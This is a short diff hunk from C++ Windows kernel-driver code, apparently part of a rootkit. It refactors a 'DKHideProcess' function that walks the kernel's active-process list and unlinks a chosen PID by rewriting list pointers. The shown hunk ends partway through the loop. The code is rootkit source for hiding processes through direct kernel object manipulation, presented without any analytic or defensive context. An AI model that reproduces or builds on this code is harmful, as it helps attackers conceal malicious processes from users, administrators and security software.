@@ -51,18 +51,15 @@ NTSTATUS kernelobjs_hiding::HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICO
 
 NTSTATUS process::DKHideProcess(ULONG64 ProcessId, BOOL IsStrict) {
 	// Assumes: PID is validated and not 0 in the entry to this function
-	PACTEPROCESS CurrentProcess = NULL;
 	LIST_ENTRY* CurrentList = NULL;
 	LIST_ENTRY* PreviousList = NULL;
 	LIST_ENTRY* NextList = NULL;
-	LIST_ENTRY* LastProcessFlink = &((PACTEPROCESS)PsInitialSystemProcess)->ActiveProcessLinks;
-
-	CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
-	PreviousList = &CurrentProcess->ActiveProcessLinks;
+	PACTEPROCESS CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
+	LIST_ENTRY* LastProcessFlink = &CurrentProcess->ActiveProcessLinks;
+	PreviousList = LastProcessFlink;
 	CurrentList = PreviousList->Flink;
 	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
 	NextList = CurrentList->Flink;
-
 	while (CurrentList != LastProcessFlink) {
 		if ((ULONG64)CurrentProcess->UniqueProcessId == ProcessId) {
 			PreviousList->Flink = NextList;
